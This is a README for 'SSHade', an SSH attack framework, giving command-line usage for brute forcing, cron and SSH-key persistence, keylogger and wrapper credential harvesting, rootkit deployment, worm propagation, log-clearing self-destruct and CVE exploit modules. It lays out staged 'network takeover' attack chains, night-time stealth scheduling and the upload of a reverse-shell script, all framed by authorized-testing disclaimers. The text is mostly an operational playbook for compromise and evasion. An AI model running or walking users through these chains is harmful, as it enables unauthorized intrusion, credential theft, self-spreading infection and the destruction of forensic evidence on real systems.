# SSHade - SSH Attack Framework

SSHade is an advanced SSH security testing and attack framework. It provides a suite of tools for brute force attacks, key-based authentication, persistence, command execution, credential harvesting, network discovery, honeypot detection, SSH fingerprinting, rootkit deployment, and worm propagation, all with a stylish and user-friendly terminal interface.

## ⚠️ **IMPORTANT SECURITY DISCLAIMER**

**This tool is for educational and authorized security testing purposes ONLY.**

- **NEVER use this tool against systems you don't own or have explicit permission to test**
- **Always ensure you have proper authorization before testing any systems**
- **Respect all applicable laws and regulations**
- **The authors are not responsible for misuse of this tool**

## 🛡️ **Legal Notice**

- Use only on systems you own or have explicit permission to test
- Unauthorized use is strictly prohibited
- This tool is intended for security professionals and researchers
- Always follow responsible disclosure practices

## Features
- Advanced SSH brute force attacks with throttling and progress tracking
- Credential scoring and prioritization for efficient attacks
- Adaptive error handling and recovery
- Colorful, stylish terminal output and progress bars
- Attack statistics and reporting
- SSH key persistence and cron job persistence
- Command execution and payload deployment
- Credential harvesting (wrapper and keylogger)
- Network discovery of SSH hosts
- Honeypot detection and analysis
- SSH banner fingerprinting with automatic vulnerability detection
- Rootkit deployment for stealth and persistence
- SSH worm propagation capabilities
- Self-destruct mechanism for cleanup
- Time-based execution windows
- Interactive shell after successful login
- CVE database integration with exploit modules

## Installation

1. **Clone the repository:**
   ```bash
   git clone https://github.com/x3fv/sshade.git
   cd sshade
   ```

2. **Install dependencies:**
   ```bash
   pip install -r requirements.txt
   ```

3. **Set up environment variables (optional):**
   ```bash
   # Option 1: Interactive setup wizard
   python3 setup.py
   
   # Option 2: Quick command-line insertion
   python3 insert_api.py --api shodan --key YOUR_SHODAN_API_KEY
   
   # Option 3: Manual setup
   cp env.example .env
   nano .env
   ```

## Environment Variables

Create a `.env` file in the project root to store sensitive configuration. You can use the interactive setup wizard or command-line tools:

### Interactive Setup Wizard
```bash
python3 setup.py
```

### Quick Command-Line Insertion
```bash
# Insert API keys
python3 insert_api.py --api shodan --key YOUR_SHODAN_API_KEY
python3 insert_api.py --api virustotal --key YOUR_VIRUSTOTAL_API_KEY

# Insert attack server configuration
python3 insert_api.py --server 192.168.1.100 --port 22 --user admin --pass password123

# Insert proxy settings
python3 insert_api.py --proxy http --url http://proxy:8080

# Insert SSH key paths
python3 insert_api.py --ssh-private /path/to/private.key --ssh-public /path/to/public.key

# Show current configuration
python3 insert_api.py --show
```

### Manual Configuration
```bash
# SSH Key paths (use demo keys for testing)
SSH_PRIVATE_KEY_PATH=keys/demo_id_rsa
SSH_PUBLIC_KEY_PATH=keys/demo_id_rsa.pub

# API Keys (optional - for enhanced features)
SHODAN_API_KEY=your_shodan_api_key_here
VIRUSTOTAL_API_KEY=your_virustotal_api_key_here
CENSYS_API_KEY=your_censys_api_key_here
CENSYS_SECRET=your_censys_secret_here

# Attack Server Configuration
ATTACK_SERVER_HOST=192.168.1.100
ATTACK_SERVER_PORT=22
DEFAULT_USERNAME=admin
DEFAULT_PASSWORD=password123

# Proxy settings (optional)
HTTP_PROXY=http://proxy:port
HTTPS_PROXY=https://proxy:port
SOCKS5_PROXY=socks5://proxy:port
```

## Usage

Run the main tool with:
```bash
python3 sshade.py [OPTIONS]
```

### Main Arguments
| Option             | Description                                                                                  |
| ------------------ | -------------------------------------------------------------------------------------------- |
| `-t, --target`     | Target IP address (required)                                                                 |
| `-p, --port`       | SSH port (default: 22)                                                                       |
| `-m, --mode`       | Attack mode: `brute`, `key`, `persist`, `exec`, `credharv`, `discover`, `detect`, `fingerprint` (required unless using `--fingerprint`) |
| `--fingerprint`    | Shortcut flag to run fingerprint mode (equivalent to `-m fingerprint`)                        |
| `--rootkit`        | Deploy rootkit for stealth and persistence                                                    |
| `--worm`           | Run SSH worm propagation mode                                                                |
| `-u, --users`      | Username wordlist path                                                                       |
| `-w, --passwords`  | Password wordlist path                                                                       |
| `--worm-username`  | Username for worm propagation                                                                |
| `--worm-password`  | Password for worm propagation                                                                |
| `-k, --key`        | SSH private or public key path (depending on mode)                                          |
| `-c, --command`    | Command to execute on the target                                                            |
| `--credharv-action`| Credential harvester action: `wrapper` or `keylogger`                                       |
| `--time-start`     | Start hour for attack execution window (0-23, default: 0)                                   |
| `--time-end`       | End hour for attack execution window (0-23, default: 23)                                    |
| `--self-destruct`  | Trigger self-destruct mechanism                                                              |
| `--clear-logs`     | Clear logs during self-destruct                                                              |
| `--fake-reboot`    | Fake system reboot during self-destruct                                                      |

## Attack Modes and Commands

### 1. Brute Force Attack
Try all combinations of users and passwords with intelligent throttling.
```bash
python3 sshade.py -t <target_ip> -m brute [-u <userlist>] [-w <passlist>]
```
**Examples:**
```bash
# Basic brute force with default wordlists
python3 sshade.py -t 192.168.1.100 -m brute

# Custom wordlists
python3 sshade.py -t 192.168.1.100 -m brute -u data/wordlists/common_users.txt -w data/wordlists/common_pass.txt

# With time window (only attack between 2 AM and 6 AM)
python3 sshade.py -t 192.168.1.100 -m brute --time-start 2 --time-end 6
```

### 2. Key-based Authentication
```bash
python3 sshade.py -t <target_ip> -m key -k <private_key_path>
```
**Note:** Currently displays warning as not yet implemented.

### 3. Persistence (SSH key or cron job)
Establish persistence on a compromised host.
```bash
python3 sshade.py -t <target_ip> -m persist [-k <public_key_path>]
```
**Examples:**
```bash
# SSH key persistence (using demo key)
python3 sshade.py -t 192.168.1.100 -m persist -k keys/demo_id_rsa.pub

# Cron job persistence (default)
python3 sshade.py -t 192.168.1.100 -m persist
```

### 4. Command Execution
Run a command on the target after successful login.
```bash
python3 sshade.py -t <target_ip> -m exec -c "<command>"
```
**Examples:**
```bash
# Basic command execution
python3 sshade.py -t 192.168.1.100 -m exec -c "whoami"

# System enumeration
python3 sshade.py -t 192.168.1.100 -m exec -c "uname -a && id && ps aux"

# File upload via SCP (after login)
python3 sshade.py -t 192.168.1.100 -m exec -c "scp payloads/reverse_shell.sh user@192.168.1.100:/tmp/"
```

### 5. Credential Harvesting
Install credential harvesting tools on the target.
```bash
python3 sshade.py -t <target_ip> -m credharv --credharv-action <wrapper|keylogger>
```
**Examples:**
```bash
# Install SSH wrapper for credential capture
python3 sshade.py -t 192.168.1.100 -m credharv --credharv-action wrapper

# Install keylogger for keystroke capture
python3 sshade.py -t 192.168.1.100 -m credharv --credharv-action keylogger
```

### 6. Network Discovery
Scan a network or IP range for live SSH hosts.
```bash
python3 sshade.py -t <target_ip_or_range> -m discover [-p <port>]
```
**Examples:**
```bash
# Discover SSH hosts in network
python3 sshade.py -t 192.168.1.0/24 -m discover

# Custom port discovery
python3 sshade.py -t 192.168.1.0/24 -m discover -p 2222
```

### 7. Honeypot Detection
Detect if the target SSH server is a honeypot.
```bash
python3 sshade.py -t <target_ip> -m detect [-p <port>]
```
**Examples:**
```bash
# Standard honeypot detection
python3 sshade.py -t 192.168.1.100 -m detect

# Custom port detection
python3 sshade.py -t 192.168.1.100 -m detect -p 2222
```

### 8. SSH Banner Fingerprinting with Vulnerability Detection
Grab and parse the SSH banner to identify software, version, and automatically detect known vulnerabilities.
```bash
python3 sshade.py -t <target_ip> --fingerprint [-p <port>]
```
**Examples:**
```bash
# Standard fingerprinting with vulnerability detection
python3 sshade.py -t 192.168.1.100 --fingerprint

# Custom port fingerprinting
python3 sshade.py -t 192.168.1.100 --fingerprint -p 2222
```

**Features:**
- **Automatic CVE Detection**: Matches SSH versions against known vulnerabilities
- **Exploit Integration**: Automatically prompts to run available exploit modules
- **Version Parsing**: Extracts software, version, and OS information
- **Extensible Database**: Easy to add new CVEs to `data/cve_db.json`

**Supported Vulnerabilities:**
- **CVE-2018-15473**: User Enumeration via Authentication Response Timing (OpenSSH 7.0-7.7)
- **CVE-2016-6210**: User Enumeration via Timing Attack (OpenSSH < 7.3)

**Exploit Modules:**
- **exploits/CVE-2018-15473/exploit.py**: Complete user enumeration exploit with timing analysis
- **exploits/CVE-2016-6210/exploit.py**: User enumeration via timing attack for older versions

**Vulnerability Scanner:**
- **exploits/vulnerability_scanner.py**: Standalone vulnerability scanner with exploit integration

**Standalone Vulnerability Scanner Usage:**
```bash
# List available exploits
python3 exploits/vulnerability_scanner.py --list

# Scan target for vulnerabilities
python3 exploits/vulnerability_scanner.py -t 192.168.1.100 --scan

# Run specific exploit
python3 exploits/vulnerability_scanner.py -t 192.168.1.100 --exploit CVE-2018-15473

# Run exploit with custom userlist
python3 exploits/vulnerability_scanner.py -t 192.168.1.100 --exploit CVE-2018-15473 -u users.txt
```

### 9. Rootkit Deployment
Deploy a rootkit for stealth and persistence on the target system.
```bash
python3 sshade.py -t <target_ip> --rootkit [-p <port>]
```
**Examples:**
```bash
# Deploy rootkit for stealth persistence
python3 sshade.py -t 192.168.1.100 --rootkit

# Custom port rootkit deployment
python3 sshade.py -t 192.168.1.100 --rootkit -p 2222
```

### 10. SSH Worm Propagation
Propagate SSH attacks across a network automatically.
```bash
python3 sshade.py -t <target_ip> --worm [--worm-username <user>] [--worm-password <pass>]
```
**Examples:**
```bash
# Worm propagation with stored credentials
python3 sshade.py -t 192.168.1.100 --worm

# Worm propagation with specific credentials
python3 sshade.py -t 192.168.1.100 --worm --worm-username admin --worm-password password123
```

### 11. Self-Destruct Mechanism
Securely remove all SSHade files and traces.
```bash
python3 sshade.py --self-destruct [--clear-logs] [--fake-reboot]
```
**Examples:**
```bash
# Basic self-destruct
python3 sshade.py --self-destruct

# Self-destruct with log clearing and fake reboot
python3 sshade.py --self-destruct --clear-logs --fake-reboot
```

## Attack Pairing Recommendations

### 🔥 **Reconnaissance Phase**
**Recommended Sequence:**
1. **Discovery → Fingerprinting → Detection**
   ```bash
   # Step 1: Find live SSH hosts
   python3 sshade.py -t 192.168.1.0/24 -m discover
   
   # Step 2: Fingerprint discovered hosts
   python3 sshade.py -t 192.168.1.100 --fingerprint
   
   # Step 3: Check for honeypots
   python3 sshade.py -t 192.168.1.100 -m detect
   ```

### ⚡ **Initial Access Phase**
**Recommended Sequence:**
1. **Brute Force → Persistence**
   ```bash
   # Step 1: Brute force attack
   python3 sshade.py -t 192.168.1.100 -m brute -u users.txt -w passwords.txt
   
   # Step 2: Establish persistence (after successful login)
   python3 sshade.py -t 192.168.1.100 -m persist -k keys/demo_id_rsa.pub
   ```

2. **Brute Force → Rootkit Deployment**
   ```bash
   # Step 1: Brute force attack
   python3 sshade.py -t 192.168.1.100 -m brute
   
   # Step 2: Deploy rootkit for stealth
   python3 sshade.py -t 192.168.1.100 --rootkit
   ```

### 🕵️ **Post-Exploitation Phase**
**Recommended Sequence:**
1. **Credential Harvesting → Worm Propagation**
   ```bash
   # Step 1: Install credential harvester
   python3 sshade.py -t 192.168.1.100 -m credharv --credharv-action wrapper
   
   # Step 2: Propagate to other hosts
   python3 sshade.py -t 192.168.1.100 --worm
   ```

2. **Command Execution → Persistence**
   ```bash
   # Step 1: Execute reconnaissance commands
   python3 sshade.py -t 192.168.1.100 -m exec -c "uname -a && whoami && ps aux"
   
   # Step 2: Establish persistence
   python3 sshade.py -t 192.168.1.100 -m persist
   ```

### 🌙 **Stealth Operations**
**Recommended for Night Operations:**
```bash
# Time-windowed attacks (2 AM to 6 AM)
python3 sshade.py -t 192.168.1.100 -m brute --time-start 2 --time-end 6

# Stealth rootkit deployment
python3 sshade.py -t 192.168.1.100 --rootkit --time-start 1 --time-end 5
```

### 🧹 **Cleanup Phase**
**Recommended for Exit Strategy:**
```bash
# Complete cleanup with log clearing and fake reboot
python3 sshade.py --self-destruct --clear-logs --fake-reboot
```

## Advanced Attack Chains

### 🎯 **Complete Network Takeover**
```bash
# Phase 1: Reconnaissance
python3 sshade.py -t 192.168.1.0/24 -m discover
python3 sshade.py -t 192.168.1.100 --fingerprint
python3 sshade.py -t 192.168.1.100 -m detect

# Phase 2: Initial Access
python3 sshade.py -t 192.168.1.100 -m brute --time-start 2 --time-end 6

# Phase 3: Persistence
python3 sshade.py -t 192.168.1.100 --rootkit

# Phase 4: Credential Harvesting
python3 sshade.py -t 192.168.1.100 -m credharv --credharv-action wrapper

# Phase 5: Propagation
python3 sshade.py -t 192.168.1.100 --worm

# Phase 6: Cleanup (when done)
python3 sshade.py --self-destruct --clear-logs --fake-reboot
```

### 🕸️ **Worm Network Propagation**
```bash
# Start worm propagation across network
python3 sshade.py -t 192.168.1.100 --worm --worm-username admin --worm-password password123

# Monitor and control via persistence
python3 sshade.py -t 192.168.1.100 -m exec -c "ps aux | grep ssh"
```

## Interactive Shell

After successful login, SSHade provides an interactive shell with internal commands:
```bash
# Available internal commands:
:help          - Show available commands
:upload <local> <remote> - Upload file via SCP
:enumerate     - Gather system information
:creds         - Show stored credentials
:exit or :quit - Exit the shell
```

## Configuration

### Setup Tools

SSHade provides two convenient tools for configuration:

#### 1. Interactive Setup Wizard (`setup.py`)
Run the interactive wizard to configure all settings:
```bash
python3 setup.py
```

The wizard will guide you through:
- API key configuration (Shodan, VirusTotal, Censys)
- Attack server settings
- Proxy configuration
- SSH key paths

#### 2. Quick Command-Line Tool (`insert_api.py`)
Insert specific settings via command line:
```bash
# Insert API keys
python3 insert_api.py --api shodan --key YOUR_API_KEY

# Configure attack server
python3 insert_api.py --server 192.168.1.100 --user admin --pass password123

# Set proxy
python3 insert_api.py --proxy http --url http://proxy:8080

# Show current configuration
python3 insert_api.py --show
```

### Manual Configuration

Edit `config.yaml` to customize:
- Default SSH port
- Connection timeouts
- Brute force delays
- Wordlist paths
- Logging levels

## Testing

### Test Rootkit Functionality
```bash
python3 attacks/test_rootkit.py
```

### Test Self-Destruct Mechanism
The self-destruct mechanism is automatically tested when the core module is imported.

## Wordlists
- Default user and password wordlists are in `data/wordlists/`
- You can specify your own with `-u` and `-w`
- Common wordlists included: `common_users.txt`, `common_pass.txt`

## Output Features
- Colorful banners and progress bars
- Real-time status and statistics
- Success and error messages
- Attack statistics with rates and durations
- Interactive shell after successful login

## Requirements
- Python 3.7+
- See `requirements.txt` for dependencies
- Linux environment recommended for full functionality

## Security Features
- **Self-destruct mechanism** for secure cleanup
- **Time-based execution windows** for stealth operations
- **Background monitoring** for tamper detection
- **Secure file deletion** using shred and overwriting
- **Log clearing** capabilities
- **Fake reboot** simulation

## Contributing

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/amazing-feature`)
3. Commit your changes (`git commit -m 'Add some amazing feature'`)
4. Push to the branch (`git push origin feature/amazing-feature`)
5. Open a Pull Request

## Security Reporting

If you discover a security vulnerability, please report it responsibly:
1. **DO NOT** create a public issue
2. Email security details to: security@yourdomain.com
3. Allow time for response before public disclosure
4. Follow responsible disclosure practices

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## Disclaimer
⚠️ **This tool is for educational and authorized security testing only. Unauthorized use is prohibited. Always ensure you have proper authorization before testing any systems.**

## Legal Notice
- Use only on systems you own or have explicit permission to test
- Respect all applicable laws and regulations
- The authors are not responsible for misuse of this tool
